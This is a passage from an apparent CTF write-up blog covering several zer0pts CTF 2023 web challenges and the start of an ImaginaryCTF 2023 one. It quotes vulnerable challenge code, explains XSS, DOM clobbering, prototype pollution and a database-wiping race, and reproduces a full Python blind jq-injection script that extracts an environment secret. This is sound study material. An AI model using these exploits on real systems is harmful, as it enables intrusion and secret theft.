punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">where</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">where</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>user<span class="token operator">?.</span>dataValues <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// user is deleted, so session should be logged out</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If you look closely and think about it, you will notice a problem here.</p><p>The problem is that if you log in with two tabs at the same time, both sessions will have a username. Then, if you delete a user on one page and perform the same operation on the other page after deletion, <code>User.findOne</code> will return <code>null</code> because the user no longer exists in the database. When it reaches <code>User.destroy</code>, it becomes <code>where: &#123;&#125;</code>, which deletes everything in the database, including the admin.</p><h3><span id="jqi-40-solves">jqi (40 solves)</span></h3><p>In this challenge, you can execute corresponding jq commands based on the conditions you set. It was through this challenge that I discovered the many functionalities of jq.</p><p>The main code is this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">KEYS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'tags'</span><span class="token punctuation">,</span> <span class="token string">'author'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>fastify<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/search'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> keys <span class="token operator">=</span> <span class="token string">'keys'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>query <span class="token operator">?</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>keys<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token constant">KEYS</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> conds <span class="token operator">=</span> <span class="token string">'conds'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>query <span class="token operator">?</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>conds<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>keys<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">10</span> <span class="token operator">||</span> conds<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key or cond'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// build query for selecting keys</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">KEYS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> keysQuery <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">key</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// build query for filtering results</span>    <span class="token keyword">let</span> condsQuery <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> cond <span class="token keyword">of</span> conds<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">[</span>str<span class="token punctuation">,</span> key<span class="token punctuation">]</span> <span class="token operator">=</span> cond<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' in '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">KEYS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// check if the query is trying to break string literal</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'\\('</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'hacking attempt detected'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        condsQuery <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">| select(.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> | contains("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"))</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[.challenges[] </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>condsQuery<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> | &#123;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>keysQuery<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&#125;]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'[+] keys:'</span><span class="token punctuation">,</span> keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'[+] conds:'</span><span class="token punctuation">,</span> conds<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>    <span class="token keyword">let</span> result<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token keyword">await</span> jq<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> <span class="token string">'./data.json'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token string">'json'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'something wrong'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>conds<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'sorry, you cannot use filters in demo version'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Although double quotation marks are blocked, the backslash <code>\</code> is not blocked. Therefore, by combining two conditions, you can insert your own jq command and achieve command injection. You can retrieve the flag using <code>env.FLAG</code>.</p><p>However, the problem is that the result is not returned, so it is a blind injection. You need to leak one character at a time. Below is the exploit from the <a href="https://blog.arkark.dev/2023/07/17/zer0pts-ctf/">zer0pts CTF 2023 writeup (4 web challs)</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> httpx<span class="token keyword">import</span> string# <span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"http://localhost:8300"</span><span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"http://jqi.2023.zer0pts.com:8300"</span><span class="token constant">CHARS</span> <span class="token operator">=</span> <span class="token string">"&#125;_"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsdef <span class="token function">make_str</span><span class="token punctuation">(</span>xs<span class="token operator">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> str<span class="token operator">:</span>    <span class="token keyword">return</span> <span class="token string">"("</span> <span class="token operator">+</span> <span class="token string">"+"</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">[</span>f<span class="token string">"([&#123;ord(x)&#125;] | implode)"</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> xs<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span>def <span class="token function">is_ok</span><span class="token punctuation">(</span>prefix<span class="token operator">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token operator">:</span>    res <span class="token operator">=</span> httpx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>        f<span class="token string">"&#123;BASE_URL&#125;/api/search"</span><span class="token punctuation">,</span>        params<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">"keys"</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span>            <span class="token string-property property">"conds"</span><span class="token operator">:</span> <span class="token string">","</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">[</span>                <span class="token string">"\\ in name"</span><span class="token punctuation">,</span>                f<span class="token string">"))] + [if (env.FLAG | startswith(&#123;make_str(prefix)&#125;)) then error(&#123;make_str('x')&#125;) else 0 end] # in name"</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"something wrong"</span>known <span class="token operator">=</span> <span class="token string">"zer0pts&#123;"</span><span class="token keyword">while</span> not known<span class="token punctuation">.</span><span class="token function">endswith</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token constant">CHARS</span><span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token function">is_ok</span><span class="token punctuation">(</span>known <span class="token operator">+</span> c<span class="token punctuation">)</span><span class="token operator">:</span>            known <span class="token operator">+=</span> c            <span class="token keyword">break</span>    <span class="token function">print</span><span class="token punctuation">(</span>known<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Flag: "</span> <span class="token operator">+</span> known<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="neko-note-26-solves">Neko Note (26 solves)</span></h3><p>This is another classic note app. The core code is as follows:</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> linkPattern <span class="token operator">=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`\[([0-9a-f]&#123;8&#125;-[0-9a-f]&#123;4&#125;-4[0-9a-f]&#123;3&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;12&#125;)\]`</span><span class="token punctuation">)</span><span class="token comment">// replace [(note ID)] to links</span><span class="token keyword">func</span> <span class="token function">replaceLinks</span><span class="token punctuation">(</span>note <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> linkPattern<span class="token punctuation">.</span><span class="token function">ReplaceAllStringFunc</span><span class="token punctuation">(</span>note<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    id <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"[]"</span><span class="token punctuation">)</span>    note<span class="token punctuation">,</span> ok <span class="token operator">:=</span> notes<span class="token punctuation">[</span>id<span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> s    <span class="token punctuation">&#125;</span>    title <span class="token operator">:=</span> html<span class="token punctuation">.</span><span class="token function">EscapeString</span><span class="token punctuation">(</span>note<span class="token punctuation">.</span>Title<span class="token punctuation">)</span>    <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span>      <span class="token string">"&lt;a href=/note/%s title=%s>%s&lt;/a>"</span><span class="token punctuation">,</span> id<span class="token punctuation">,</span> title<span class="token punctuation">,</span> title<span class="token punctuation">,</span>    <span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// escape note to prevent XSS first, then replace newlines to &lt;br> and render links</span><span class="token keyword">func</span> <span class="token function">renderNote</span><span class="token punctuation">(</span>note <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  note <span class="token operator">=</span> html<span class="token punctuation">.</span><span class="token function">EscapeString</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span>  note <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>note<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span>  note <span class="token operator">=</span> <span class="token function">replaceLinks</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span>  <span class="token keyword">return</span> note<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After sanitization, the link will be replaced. Although there is also escaping here, because the attribute is not enclosed in quotes, arbitrary attributes can be injected into the <code>a</code> tag.</p><p>Here, triggering XSS seems possible with <code>onanimationend</code> or <code>onfocus</code>.</p><p>After triggering XSS, there is another step, which is that the stolen information is deleted. However, you can use the magical <code>document.execCommand(&#39;undo&#39;);</code> to restore it.</p><h3><span id="scoreshare-16-solves">ScoreShare (16 solves)</span></h3><p>The core code for this challenge is as follows:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        abc <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        link <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> title<span class="token punctuation">:</span>            flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">'Title is empty'</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span> abc<span class="token punctuation">:</span>            flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">'ABC notation is empty'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            sid <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">,</span> title<span class="token punctuation">)</span>            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> abc<span class="token punctuation">)</span>            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">,</span> link<span class="token punctuation">)</span>            <span class="token keyword">return</span> flask<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>url_for<span class="token punctuation">(</span><span class="token string">'score'</span><span class="token punctuation">,</span> sid<span class="token operator">=</span>sid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">"upload.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/score/&lt;sid>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">score</span><span class="token punctuation">(</span>sid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Score viewer"""</span>    title <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">)</span>    link <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> link <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">"Score not found"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">"score.html"</span><span class="token punctuation">,</span> sid<span class="token operator">=</span>sid<span class="token punctuation">,</span> link<span class="token operator">=</span>link<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/score/&lt;sid>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">api_score</span><span class="token punctuation">(</span>sid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    abc <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> abc <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>abc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You can add a post or something similar, and there is an unintended endpoint <code>/api/score/&lt;sid&gt;</code> that directly outputs the entire <code>abc</code>. So, by adding two posts, one with JS content and the other with <code>&lt;script src=...&gt;</code>, you can directly perform XSS.</p><p>The expected solution can be found in the author’s article: <a href="https://ptr-yudai.hatenablog.com/#ScoreShare">zer0pts CTF 2023 Writeup</a>. By using iframe DOM clobbering and combining it with the existing functionality, prototype pollution can be achieved, and then the gadget for ABCJS can be found.</p><h3><span id="ringtone-14-solves">Ringtone (14 solves)</span></h3><p>This challenge is a bit complicated, so I’ll briefly summarize it. You can obtain an XSS in the Chrome extension context through DOM clobbering. Then, using <code>chrome.history.search</code>, you can retrieve the flag URL and obtain the flag.</p><p>Author’s writeup: <a href="https://ahmed-belkahla.me/post/zer0ptsctf2023/">Ringtone Web Challenge Writeup - Zer0pts CTF 2023</a></p><h3><span id="plain-blog-14-solves">Plain Blog (14 solves)</span></h3><p>This challenge is a blog app. You need permission to retrieve the flag, and to have this permission, your post must have more than 1_000_000_000_000 likes. However, it is clear that the website blocks the maximum number of likes, so it is impossible to reach such a high number.</p><p>The solution lies in a frontend prototype pollution vulnerability. By exploiting this vulnerability, you can contaminate the parameters of the fetch request and include the <code>X-HTTP-Method-Override: PUT</code> header, allowing the admin bot to directly call another API and obtain the permission.</p><h2><span id="imaginaryctf-2023">ImaginaryCTF 2023</span></h2><h3><span id="sanitized-5-solves">Sanitized (5 solves)</span></h3><p>The code for this challenge is quite short, and one thing worth noting is that the CSP is set to <code>default-src &#39;self&#39;</code>. Additionally, there is a path in Express:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Page </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>path<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> not found</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>It can be seen that the response from this path needs to be used as a script to execute.</p><p>On the frontend side, it is a classic call to DOMPurify:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token keyword">const</span> html <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> html  document<span class="token punctuation">.</span><span class="token 